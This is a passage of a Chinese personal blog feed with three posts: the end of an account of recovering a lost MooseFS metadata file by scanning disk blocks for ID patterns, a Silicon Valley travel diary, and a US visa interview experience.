<p>上面的方法不能继续用了，新的挑战来了。虽然方法不能继续用，但是思想肯定还是一致的——果然，edge 区有两个 id 可以用，一个 parent id，一个 child id。用程序打印了一下 id 发现，虽然不是严格连续，但是规律性很明显，基本上是 parent id 很久不变，child id 递减，减到 0 之后，parent id 就变一个。</p>

<p>有了这个特征之后，edge 区也很容易分析了。用这个特征，我恢复出了文件前 168M 的数据。令人兴奋的一点是，这 168M 里面，edge 区在最后 8M 结束了，同时 edge 区之后的几个比较小的区直接也包含在这 8M 里了，最后一个大去 chunk 区在这 8M 里面开始。于是就不需要分析中间几个小区了，只需要分析 chunk 区就行了。胜利就在眼前了！</p>

<p>chunk 区这次也有 id，叫 chunk id，但是，它不连续了。只能分析其他特征了。经过观察发现，chunk 区每个 chunk 大小是固定的，都是 16 字节，前 8 字节是 chunk id，没有明显规律，中间 4 字节是 version，后面 4 字节是 lockedto，而大多数 chunk 的 version 和 lockedto 都很小，基本都是小于 10 的值。哈哈，特征又来了！</p>

<p>我又写了一个 c 程序，每 16 字节为一组进行分析，如果这 16 字节的后面 8 个字节表示成两个 int 值都很小，就符合特征。如果连续很长的数据都符合特征，那么就很可能是 metadata.mfs 的 chunk 区。另外，虽然 chunk id 不严格连续，但是也能找到规律，那就是一段范围内 chunk id 的高位总是相同的，所以我只需要手动分析高位就能尝试连接了。</p>

<p>经过很久的分析和处理，进展越来越多，最后，当我恢复到 200M 左右的时候，程序出错了。到出错的现场查看发现，在一个 block 中间，某个 chunk 之后，数据全是 0 了。而 chunk 区的结束标志就是 0！</p>

<p>这，到底是完成了？！还是出错了？数据被覆盖了？我努力让自己冷静，如果是数据被覆盖的话，那应该整个 block 都被用了，而这是在 block 中间，所以被覆盖的可能性应该不大。当然，如果写一个文件，fseek 到某个位置之后才开始写的话，还是会造成这种中间开始覆盖的。但是我觉得这种可能性不大。另外，根据 chunk id 来看，和现有 chunk 应该数量差不多。所以，我觉得应该是恢复完成的可能性很大！</p>

<p>于是我把文件结束在了 216227836 byte 的地方，在把文件重新跑了一次，果然解析成功了！</p>

<p>再把仍然保存的 moosefs 最新 changelog 拿出来，用 mfsmetarestore 去生成最新的 metadata.mfs 文件，也执行成功了！这说明我恢复出来的文件就是正确的！否则的话，mfsmetarestore 在 restore 的过程中应该会遇到 chunk id 找不到的情况。</p>

<p>真的成功了！！启动 moosefs，一切都显示正常，mfsmount 了之后，文件都能正常访问！! 在分析了将近 20 个小时之后，终于成功了！！</p>

<p>最终恢复出的文件有 200 多 M，由 13 个片段组成：</p>

<pre>
| offset (4k size) | size |
| ---------------- | ---- |
|     12314624     | 16M  |
|     12322816     | 40M  |
|     12341248     | 8M   |
|     12345344     | 16M  |
|     12365824     | 32M  |
|     12388352     | 16M  |
|     12398592     | 8M   |
|     12404736     | 24M  |
|     12421120     | 8M   |
|     12425216     | 8M   |
|     12431360     | 16M  |
|     12460032     | 8M   |
|     12478464     | 6M+  |
</pre>


<p>可见文件数据块分配的时候，offset 是逐渐递增的，并且每个块都在 8M 以上。这些特性也给数据恢复带来了帮助。否则要是文件片段有上百个，每个大小几十 K 的话，那至少要恢复几天才有可能。</p>

<h2>后记和总结</h2>

<p>回想整个恢复的过程，由于 inode 信息都丢失了，所以能做的也就是全盘搜索数据块找特征，然后尝试拼接。所幸 metadata.mfs 文件特征明显，当然最重要的还是各种 id 都比较连续，使得找出数据块之后拼接成为可能。另外一个很重要的原因就是运气，200 多 M 的数据在磁盘上一个字节都没有丢失。不然中间只要丢一个 block，整个恢复都会失败。</p>

<p>所以现在看来，听起来好高深的数据恢复，其实就是 写程序找特征 + 尝试拼接 + 撞大运。</p>

<h3>关于 moosefs</h3>

<p>在长达 20 个小时的数据恢复过程中，我做的最多的一件事情就是骂 moosefs 的作者。因为真的不能忍受他写的代码了。没有文档就算了，居然上千行的程序一点注释都没有！</p>

<p>然后程序里面有各种 if define 条件编译，在 vim 里面还没法匹配 ifdef 和 endif，让我看代码的时候根本不知道哪块代码是运行的代码。这给写解析程序也带来了巨大的麻烦。真不知道作者是怎么理清这么复杂的逻辑的。</p>

<p>另外一个不得不说的地方就是，前面提过的，写文件和关闭文件居然不判断返回值，少有的判断返回值的地方还没有错误处理，直接打印一句 log 草草了事，后面仍然删文件。</p>

<p>当然，数据丢失也是我们自己的过错，对 moosefs 没有足够的了解和重视，以至于忘了备份如此重要的文件。</p>

<p>不管怎样，经历了这一次波折之后，还是学到了很多东西的，也有了一点点数据恢复的经验。生活就是如此跌宕起伏才有意义，C&#8217;est La Vie!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Trip to the Silicon Valley]]></title>
    <link href="http://blog.ztrix.me/blog/2012/04/03/trip-to-the-valley/"/>
    <updated>2012-04-03T14:36:09+08:00</updated>
    <id>http://blog.ztrix.me/blog/2012/04/03/trip-to-the-valley</id>
    <content type="html"><![CDATA[<p>还是写点记录文字吧。</p>

<p>3 月 4 号坐上了 Boeing 747，飞机真的很大。人不多，我那一排 3 个座位就我一个人，于是睡得很舒服。</p>

<p>到的时候已经是下午了。能看到加州下午的阳光，斜斜地洒下来，浓淡相宜，周围嘈杂而安静。</p>

<p>飞机上一路基本睡过来的，加上本来作息时间就不规律，倒时差还是很快的。</p>

<!-- more -->


<h2>交通</h2>

<p>到美国第一印象就是公路真是好破啊。坑坑洼洼的，要不是汽车都有减震器，估计坐车会把屁股颠坏。不过公路虽然烂，公路的覆盖是没话说的，到处都是公路，并且没有看到收费站。美国的理念体现在一点一滴。</p>

<p>到了美国，才知道美国人真的是非常遵守交通规则的，很少见到有闯红灯的，并且路中心都是不能走人的，所以想过马路的话，就得先走到马路尽头，然后等绿灯过马路，最后再绕回去。在美国的两个星期里，加上自己，总共也就遇到 5 次不到有人闯红灯。至于我，纯粹是出于好玩，或者让美国之行更加完整，故意闯了一次红灯。</p>

<p>另外一件得到印证的事情就是，美国的车真得都是对行人很友好的。我遇到了好几次，当行人和车在没有红绿灯的小路口相遇的时候，一定是车让行人先走。不得不感慨。</p>

<p>加州有一个可以称为城际铁路的 Caltrain。Caltrain 列车是两层的列车，银灰色条纹车皮，和电影 Source Code 里面的列车景象是多么相似。但是感觉速度好慢，晃晃悠悠的，和国内的列车呼啸完全是两种感觉。后来知道，就在那天，有个人被 Caltrain 撞死了，是 Paypal 的一个高级 VP，默哀。</p>

<p>在 SF 玩的时候，看到了特别陡的公路，一眼看过去，盗梦空间的马路翻转效果就在眼前。另外一个比较好玩的就是有一条公路九曲十八弯的，曲率特别大，在上面开车方向盘不知道要转多少次。</p>

<h2>天气</h2>

<p>加州的天真的很不错。不过昼夜温差大了点，晚上刮起风来，还是很冷的。去的两周里，还下了好几天的雨，不过都不是很大，下得很随意。只要不下雨，没有乌云，天都是很蓝的，很祥和的蓝。不过有乌云的时候，天也很可怕的，一大片乌云黑压压的。</p>

<h2>人</h2>

<p>美国人果然是没有国内的人对减肥有那么大的兴趣的，路上经常能看到很胖很胖的人，男女都有，许多还胖得离谱。另外街上经常能看到各种怪人，诸如看起来在吸毒的，还有比较像疯子的那种一遍走路一边疯疯癫癫唱歌乱叫的。</p>

<p>所以走在美国大街上的感觉是断然不如国内的。胖子多，怪人多，美女少。从我的眼光来看，在美国的两周内，看到的能够称得上漂亮的女人只有 2 个。估计是东西方审美标准差别太大。所以还是走在国内大街上好啊。</p>

<p>我遇到的大多数美国人都还是挺友好的。遇到的唯一不够友好的，是去 Steve Jobs 故居的时候，在路边有个胖女人对我们大声喊叫 You gotta go, 要赶我们走，并称要叫警察，我们解释了半天也没有用。</p>

<p>去渔人码头玩的时候，看到很多街边艺人。最先遇到的是在街边唱歌赚钱的一个三人小乐队。乐器很简朴，但是三个人看起来都好开心，完全不像北京见到的流浪歌手一脸深沉愁眉不展的样子。</p>

<p><img src="http://blog.ztrix.me/images/trip-to-the-valley/happy-singer.jpg" alt="happy-singer" /></p>

<p>另外看到了好几个模仿机器人逗游客玩的那种街边艺术，并且是有声音效果的！可以看到有声效的时候，他的嗓子是有变化的，所以应该是用嗓子发出来的声音吧。真的不容易！</p>

<p>虽然这里是讲人，但顺便提一下动物吧。渔人码头那里有很多鸟，估计是被游客惯坏了，鸟都是不怕人的。这些鸟基本都是三栖的，水陆空都能随意畅游，真羡慕啊。</p>

<p><img src="http://blog.ztrix.me/images/trip-to-the-valley/bird.jpg" alt="bird" /></p>

<h2>Stanford</h2>

<p>去美国只逛了一所大学，就是 Stanford.</p>

<p><img src="http://blog.ztrix.me/images/trip-to-the-valley/stanford.jpg" alt="stanford" /></p>

<p>Stanford 校园真的是很漂亮，整齐幽雅又有情调的那种漂亮，让人非常感觉非常舒适。</p>

<p><img src="http://blog.ztrix.me/images/trip-to-the-valley/stanford2.jpg" alt="stanford" /></p>

<p>在教堂前面拍的，路上一点垃圾都没有！</p>

<h2>Golden Gate Bridge</h2>

<p><img src="http://blog.ztrix.me/images/trip-to-the-valley/golden-gate-bridge.jpg" alt="golden-gate-bridge" /></p>

<p>在加州见到的桥都是斜拉桥，金门大桥也不例外。据说桥的高度允许下面通行航空母舰。真的很壮观的说。</p>

<h2>吃</h2>

<p>看到各种餐厅都有，当然要去尝试一下。两周内，去了日本餐馆，泰国餐馆，越南餐馆，中国餐馆，当然西餐厅也没少去。现在回味起来，感觉日式餐馆和泰国餐馆都不错，越南餐馆吃的那一顿感觉不太好，可能是餐馆太小了。吃的中餐感觉都还不错，虽然到了美国，但是中国的味还都在。还在一家餐馆吃了墨西哥肉卷，味道也还不错，就是不喜欢里面的黑豆。</p>

<p>西餐的话，Pizza，汉堡，生菜Salad 这些，我还是吃的惯的，所以，不挑食就是好呀，到哪都不会饿死。吃的比较爽的一顿是最后临走前吃了一顿牛排，味道真的不错，就是西式刀叉我用起来好别扭，切肉完全切不动。</p>

<p>去渔人码头的时候，吃了一顿海产品，也是吃的很爽的一顿。非常大的龙虾，非常大的螃蟹，吃起来很舒服，一向不喜欢吃海产品的我都可以吃得很有回忆。</p>

<h2>回国</h2>

<p>回来的时候，带了 2 个 ipad 3 和 2 个 iphone4s。入关的时候还惴惴不安的，怕查到交税，结果一直到出门都没看到有人检查的迹象。</p>

<h2>misc</h2>

<p>虽然只去了两周，但是感觉还是很充实的。体会到了很多异国情调。也让我有了更多的思考。</p>

<p>最后来一张飞机上的照片吧，可以看到地球是圆的。</p>

<p><img src="http://blog.ztrix.me/images/trip-to-the-valley/plane.jpg" alt="plane" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[一签水过]]></title>
    <link href="http://blog.ztrix.me/blog/2012/02/02/visa-1k-water-pass/"/>
    <updated>2012-02-02T09:52:27+08:00</updated>
    <id>http://blog.ztrix.me/blog/2012/02/02/visa-1k-water-pass</id>
    <content type="html"><![CDATA[<p>一签水过，来这里稍微记录一下，以备后用。</p>

<h2>预约</h2>

<p>预约是很纠结的一件事情。尤其是我预约的时候是 1 月 19 左右，当时在家，只好请还在北京的同学帮忙去中信银行买了一下加密电话卡，付了签证费用。</p>

<p>第一次打电话还算顺利，准备好各个号码之后，拨通电话，预约日期只有 1 月 27 到 1 月 31 号可以选，2 月好像还没开始。于是预约了 30 号。</p>

<!-- more -->


<p>到了 29 号的时候，邀请信还没寄到（B1 签证），无奈只好再去买电话卡重新预约。结果 29 号是星期天，人工电话服务周日不工作。而我预约的是 30 号早上 9:15 的签证。</p>

<p>30 号早上 7 点钟就爬了起来，准备重新预约。结果电话一直打不进去，不停地说密码有效期是 12 个月，如果用完 8 分钟或者 12 分钟则需要重新付款云云。难道我打电话出了什么错？总之就一直打不通，到现在也没弄明白是为什么。好吧。我就放大使馆鸽子了。睡觉去了。</p>

<p>一睡睡到 12 点。起床后又打了几遍，依然不通。等到了下午 5 点左右又尝试了一遍，居然通了！想起来上次也是 5 点左右打的，难道还和时间有关？是不是上午打电话的人太多了？占线？总之完全没搞懂。</p>

<p>打通了之后一问，只有 2 月 1 号和 2 号可以预约到。就预约了 2 月 2 号早上 8 点的。现在想想其实挺险的。因为最后邀请函到 2 月 1 号下午才到。如果到不了的话，那么就得再次改预约，而 30 天内只能预约 2 次。</p>

<h2>准备材料</h2>

<p>B1 签证要准备的材料还是很多的。看了一下网上的流传清单，各种财产证明，工作证明，结婚证什么的，很多。好在我是学生，一概不需要。最后准备的也就是中英文简历。然后把学生证，成绩单，邀请函。感觉准备的东西太少很不踏实。但也没有办法，这个时间学校都没开门，集体户口没法去拿。身份证复印件也没带。虽然准备的东西少感觉不踏实，不过也很轻快，至少找什么材料都能很快找到。</p>

<h2>签证</h2>

<p>2 月 2 号早上 6 点我就爬了起来。吃了点东西，扔下手机，6 点半就出发了。打的将近半个小时就到了。然后就是排队。看了一下在我前面的大概有 30 多个。还算很早的。</p>

<p>7 点 15 左右进场。4 人编一组进去排队递交材料。交完材料后去摁指纹，然后就在摁指纹旁边的窗口排队等待。</p>

<p>一开始我还以为还有什么其他手续，就在那里等，结果等工作人员安排我们到一个新开的窗口的时候，发现居然已经开始签证面谈了。我又是排 4 人一组第一位的，心里紧了一下，连忙把材料递了进去。</p>

<p>“你好”。VO 用不是很标准的汉语说。</p>

<p>&ldquo;Hello.&rdquo; 我表明一下我是可以用英语面谈的。</p>

<p>然后签证官问我去美国做什么。我就按准备好的来回答了一下。接着他又问了我准备在美国待多长时间，以前去过美国没，以前去过其他国家没。然后他看到我是 THU 的学生，就向我确认了一下，我就递上了我的学生证。</p>

<p>&ldquo;Have a nice trip!&rdquo;. 真没想到这么快。大概才问了 5 个问题就过了。我越来越觉得做为 THU 的学生真是好处多多。总之还是觉得运气还是很不错的。可能早上刚开始，VO 的心情也还不错吧。</p>

<p>随后就去邮局办了手续。结果到了邮局还没开门，才 8 点半左右。看到网上有人排队到下午 1 点多，感慨幸亏起得比较早。作为第一批进馆的，一切都还比较有条不紊。如果到了 9 点多进馆，乱哄哄的，估计真要到下午才能办完了。</p>

<h2>感想</h2>

<ul>
<li>早起的鸟儿有虫吃。到的早，无论自己还是别人都没有丝毫疲劳，心情都很舒畅。做事要趁早。</li>
<li>虽然准备的材料只用到了一点点。但是从准备的角度来说，还是应该都备齐的。因为政府办事本身就是一个随机性很大的事情，程序和手续还很繁杂。万一一个材料没备齐，VO 让你准备好下次再来就很麻烦了。所以还是要尽自己的努力把要准备的都准备好，争取一次通过。</li>
</ul>


<h2>后续</h2>

<p>2013 年 8 月有机会去美国参加比赛，但是由于怕 check 就走了旅游签证 B2。签证的时候很纠结到底是面签还是递签，面签随机性太大，递签又怕类型不同会有问题（上次 B1 这次 B2），而且那个时候还是要送到广州递签的，一来一回又消耗不少光阴。最后还是选择了递签，结果大概一周多的样子就查到已经通过了。看来担心是多余的。另外中信银行现在递签已经不要钱了，为啥总是感觉怪怪的。</p>
]]></content>
  </entry>
  
</feed>
